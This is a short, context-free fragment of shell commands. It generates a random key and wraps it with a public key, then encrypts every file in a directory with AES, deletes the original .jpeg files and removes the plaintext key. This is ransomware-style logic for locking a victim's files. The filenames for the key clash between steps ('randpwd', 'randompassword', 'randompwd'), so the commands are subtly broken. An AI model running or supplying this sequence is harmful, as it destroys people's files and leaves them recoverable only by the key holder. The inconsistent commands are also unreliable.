...
openssl rand -hex 32 | cat > randpwd && openssl pkeyutl -encrypt -inkey pubkey.pem -pubin -in randompassword -out randpwd.enc
...
for f in * ; do [ -f $f ] && openssl enc -p -aes-256-cbc -salt -in $f -out $f.enc -pass file:./randpwd; done; rm *.jpeg; rm randompwd*; rm pubkey.pem*
